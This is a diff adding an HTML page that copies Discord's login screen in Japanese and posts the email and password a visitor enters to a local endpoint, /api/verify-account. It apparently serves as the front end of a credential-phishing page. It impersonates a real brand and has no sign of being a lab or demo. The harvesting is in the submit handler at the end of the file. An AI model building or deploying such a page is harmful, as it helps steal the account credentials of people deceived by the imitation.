@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Discord Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700;900&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Noto Sans JP', "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            touch-action: pan-x pan-y;
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+
+        body {
+            background-color: #1e1f22;
+            color: #f2f3f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+
+        .background-glow {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .glow-top {
+            width: 400px;
+            height: 400px;
+            background: rgba(88, 101, 242, 0.1);
+            top: -100px;
+            left: -100px;
+        }
+
+        .glow-bottom {
+            width: 500px;
+            height: 500px;
+            background: rgba(88, 101, 242, 0.05);
+            bottom: -150px;
+            right: -100px;
+        }
+
+        .login-container {
+            background-color: #313338;
+            width: 100%;
+            max-width: 480px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            max-height: 100%;
+            overflow-y: auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            fill: #b5bac1;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #f2f3f5;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 16px;
+            color: #b5bac1;
+            font-weight: 400;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #b5bac1;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+        }
+
+        .form-group label span {
+            color: #f23f42;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            padding: 10px 12px;
+            font-size: 16px;
+            color: #dbdee1;
+            outline: none;
+            transition: background-color 0.2s;
+            height: 40px;
+            -webkit-user-select: text;
+            user-select: text;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .input-field:focus {
+            background-color: #1e1f22;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            fill: #b5bac1;
+        }
+
+        .forgot-password {
+            font-size: 14px;
+            color: #00a8fc;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 4px;
+            display: inline-block;
+            cursor: pointer;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            background-color: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 12px 16px;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            height: 44px;
+            margin-top: 8px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .login-btn:hover {
+            background-color: #4752c4;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .register-link {
+            font-size: 14px;
+            color: #949ba4;
+            text-align: left;
+            margin-top: 4px;
+        }
+
+        .register-link a {
+            color: #00a8fc;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background-color: #313338;
+                align-items: flex-start;
+            }
+            .login-container {
+                box-shadow: none;
+                padding: 24px 16px;
+                max-width: 100%;
+                border-radius: 0;
+                height: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background-glow glow-top"></div>
+    <div class="background-glow glow-bottom"></div>
+
+    <div class="login-container">
+        <div class="header">
+            <svg class="back-button" viewBox="0 0 24 24" aria-hidden="true">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M10.2 3.6a1 1 0 0 0-1.4 0L2.6 9.8a1 1 0 0 0 0 1.4l6.2 6.2a1 1 0 0 0 1.4-1.4L5.6 11.4h14.8a1 1 0 1 0 0-2H5.6l4.6-4.6a1 1 0 0 0 0-1.2z"></path>
+            </svg>
+            <h1>おかえりなさい！</h1>
+            <p>またお会いしましたね！</p>
+        </div>
+
+        <form id="loginForm" onsubmit="return false;">
+            <div class="form-group">
+                <label>メールアドレスまたは電話番号 <span>*</span></label>
+                <div class="input-wrapper">
+                    <input type="text" id="emailInput" class="input-field" autocomplete="username" autofocus>
+                </div>
+            </div>
+
+            <div class="form-group" style="margin-top: 20px;">
+                <label>パスワード <span>*</span></label>
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" class="input-field" autocomplete="current-password">
+                    <div class="password-toggle">
+                        <svg width="20" height="20" viewBox="0 0 24 24">
+                            <path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5zm0-8c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.3-3-3-3z"/>
+                        </svg>
+                    </div>
+                </div>
+                <a href="#" class="forgot-password" onclick="return false;">パスワードをお忘れですか？</a>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">ログイン</button>
+        </form>
+
+        <div class="register-link">
+            アカウントをお持ちでないですか？ <a href="#" onclick="return false;">登録</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const loginBtn = document.getElementById('loginBtn');
+
+            if (!email || !password) {
+                alert('メールアドレスとパスワードを入力してください。');
+                return;
+            }
+
+            loginBtn.textContent = '確認中...';
+            loginBtn.disabled = true;
+
+            try {
+                const response = await fetch('http://localhost:3000/api/verify-account', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const data = await response.json();
+
+                if (data.status === 'success') {
+                    alert(data.message);
+                } else {
+                    alert(data.message);
+                }
+            } catch (error) {
+                alert('通信エラーが発生しました。サーバーが起動しているか確認してください。');
+            } finally {
+                loginBtn.textContent = 'ログイン';
+                loginBtn.disabled = false;
+            }
+        });
+
+        document.querySelector('.password-toggle').addEventListener('click', () => {
+            const passInput = document.getElementById('passwordInput');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+            } else {
+                passInput.type = 'password';
+            }
+        });
+    </script>
+
+</body>
+</html>
